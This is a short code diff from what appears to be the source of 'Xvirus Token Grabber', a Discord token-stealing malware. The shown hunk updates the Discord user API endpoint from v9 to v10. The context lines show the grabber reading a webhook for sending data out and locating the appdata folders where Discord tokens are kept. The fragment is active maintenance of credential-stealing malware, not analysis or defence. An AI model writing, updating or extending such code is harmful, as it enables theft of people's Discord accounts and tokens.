@@ -196,7 +196,7 @@ Injection(functions)
 class Xvirus_Token_Grabber(functions):
     def __init__(self):
         self.webhook = self.fetchConf('webhook')
-        self.baseurl = "https://discord.com/api/v9/users/@me"
+        self.baseurl = "https://discord.com/api/v10/users/@me"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
         self.dir = mkdtemp()
